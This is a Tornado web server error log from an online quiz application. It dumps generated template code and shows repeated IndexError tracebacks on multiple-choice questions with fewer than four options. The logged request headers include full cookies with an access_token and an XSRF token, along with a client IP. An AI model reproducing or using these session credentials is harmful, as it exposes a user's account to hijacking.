64      _append('"></script>\n<script src="')  # base.html:95 (via base.html:93)
65      _tmp = static_url('js/libs/blurb.min.js')  # base.html:95 (via base.html:93)
66      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:95 (via base.html:93)
67      else: _tmp = _utf8(str(_tmp))  # base.html:95 (via base.html:93)
68      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:95 (via base.html:93)
69      _append(_tmp)  # base.html:95 (via base.html:93)
70      _append('"></script>\n<script src="')  # base.html:96 (via base.html:93)
71      _tmp = static_url('js/IT.js')  # base.html:96 (via base.html:93)
72      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:96 (via base.html:93)
73      else: _tmp = _utf8(str(_tmp))  # base.html:96 (via base.html:93)
74      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:96 (via base.html:93)
75      _append(_tmp)  # base.html:96 (via base.html:93)
76      _append('"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-dropdown.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-button.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-modal.js"></script>\n')  # base.html:100 (via base.html:93)
77      _append('\n')  # base.html:102
78      for js in kwargs['js_deps']:  # base.html:102
79          _append('\n<script src="')  # base.html:103
80          _tmp = static_url(js)  # base.html:103
81          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:103
82          else: _tmp = _utf8(str(_tmp))  # base.html:103
83          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:103
84          _append(_tmp)  # base.html:103
85          _append('"></script>\n')  # base.html:104
86      _append('\n')  # base.html:106
87      _append('\n')  # test/test.html:11 (via base.html:106)
88      _append('\n<div class="container">\n<div class="footer"><font color="#FFFFFF" size="2px"> <p class="alignleft">InTheory Media Limited \xc2\xa9 2012</p>\n<p class="alignright">About Us | Terms & Conditions | Privacy Policy | Support </p></font></br>\n</div>\n</div>\n</body>\n</html>\n')  # base.html:118
89      return _utf8('').join(_buffer)  # base.html:0
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=505ca8c88e4c854816f4874a&answers=%5B0%2C3%5D&cursor=2&_xsrf=43ea8fce5e674ca7a13037d552738914', headers={'Referer': 'http://www.intheory.co.uk/test/new', 'Content-Length': '96', 'Accept-Language': 'en-us,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20100101 Firefox/15.0.1', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'X-Real-Ip': '109.158.140.86', 'Cookie': '__utma=188782963.301924102.1348247947.1348247947.1348247947.1; __utmb=188782963.16.10.1348247947; __utmc=188782963; __utmz=188782963.1348247947.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); access_token="QUFBRzZsTmNzNkdjQkFJdnY0WkJaQ3JEdVZ3Yzh3RWoxUmFkU1pCYU0wdVVQQm5zMTJBMDdUSmlkT2FRa0xMN3Uwdkc5WWNQa0pyWG8xb2ZSd1E1WEpjVWpVQTl5NEV4Q3Q0c2NneG16Z1pEWkQ=|1348247985|bdc640f1e234f73d99fb4834e8ab66e549fc826a"; _xsrf=43ea8fce5e674ca7a13037d552738914', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 111.30ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=505ca8c88e4c854816f4874a&answers=%5B0%5D&cursor=5&_xsrf=43ea8fce5e674ca7a13037d552738914', headers={'Referer': 'http://www.intheory.co.uk/test/new', 'Content-Length': '92', 'Accept-Language': 'en-us,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20100101 Firefox/15.0.1', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'X-Real-Ip': '109.158.140.86', 'Cookie': '__utma=188782963.301924102.1348247947.1348247947.1348247947.1; __utmb=188782963.16.10.1348247947; __utmc=188782963; __utmz=188782963.1348247947.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); access_token="QUFBRzZsTmNzNkdjQkFJdnY0WkJaQ3JEdVZ3Yzh3RWoxUmFkU1pCYU0wdVVQQm5zMTJBMDdUSmlkT2FRa0xMN3Uwdkc5WWNQa0pyWG8xb2ZSd1E1WEpjVWpVQTl5NEV4Q3Q0c2NneG16Z1pEWkQ=|1348247985|bdc640f1e234f73d99fb4834e8ab66e549fc826a"; _xsrf=43ea8fce5e674ca7a13037d552738914', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 97.78ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
